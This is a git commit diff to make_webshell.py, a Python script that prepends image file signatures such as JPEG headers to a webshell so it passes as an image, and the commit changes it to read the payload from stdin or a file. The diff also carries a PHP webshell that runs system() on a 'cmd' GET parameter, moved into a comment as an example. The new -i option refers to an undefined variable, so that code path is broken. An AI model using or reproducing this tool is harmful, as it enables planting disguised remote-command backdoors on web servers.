449b3e234eb67a2b8927f5b9848b07a17acb8752
tchn <tchn.fr.g@gmail.com>
2013-04-03 13:11:33 +0900

    Modify to take file contents via stdin

--- make_webshell.py
+++ make_webshell.py
@@ -1,31 +1,35 @@
 #!/bin/env python
 # -*- coding: UTF-8 -*-
 #
-# prog_name [-t file_format_number] < -o out_file > 
+# you can use your file either via stdin or specifying with -i option
+# e.g.)
+# cat yourshell | python prog_name -t file_format_number -o out_file
+# python prog_name -i yourshell -t file_format_number -o out_file
+#
+# PHP webshell example
+#SHELL = """
+#<head>
+#<title>
+#simple php shell PoC
+#</title>
+#</head>
+#<body>
+#<h2>Command Output</h2>
+#<pre>
+#<?php
+#if(isset($_GET['cmd'])){
+# $cmd = $_GET['cmd'];
+#  system($cmd);
+#   die;
+#   }
+#   ?>
+#</pre>
+#</body>
+#</html>
+#"""
 
 import sys
 from optparse import OptionParser
-
-SHELL = """ 
-<head>
-<title>
-simple php shell PoC
-</title>
-</head>
-<body>
-<h2>Command Output</h2>
-<pre>
-<?php
-if(isset($_GET['cmd'])){
- $cmd = $_GET['cmd'];
-  system($cmd);
-   die;
-   }
-   ?>
-</pre>
-</body>
-</html>
-"""
 
 FILE_FORMAT_MAP = {
     '0': 'jpeg',
@@ -46,13 +50,13 @@ def return_data(format_key):
     signature = SIGNATURE_MAP.get(filetype)
     return signature
 
-def write_file(signature, filename):
+def write_file(signature, inputbuf, outfilename):
     if hasattr(signature, '__iter__'):
-        data = signature[0] + SHELL + signature[1]
+        data = signature[0] + inputbuf + signature[1]
     else:
-        data = signature + SHELL
+        data = signature + inputbuf
         
-    out_file = open(filename, 'w')
+    out_file = open(outfilename, 'w')
     out_file.write(data)
     out_file.flush()
 
@@ -61,7 +65,13 @@ if __name__ == '__main__':
     parser = OptionParser('Usage: %prog [-t file_format_number] < -o out_file >')
     parser.add_option('-t', '--type', action='store', dest='file_format_key', help='')
     parser.add_option('-o', '--out', action='store', dest='out_filename', help='')
+    parser.add_option('-i', '--in', action='store', dest='in_filename', help='')
     (options, args) = parser.parse_args()
 
+    if options.in_filename is not None:
+        shell = open(in_filename, 'r').read()
+    else:
+        shell = sys.stdin.read()
+
     signature = return_data(options.file_format_key)
-    write_file(signature, options.out_filename)
+    write_file(signature, shell, options.out_filename)
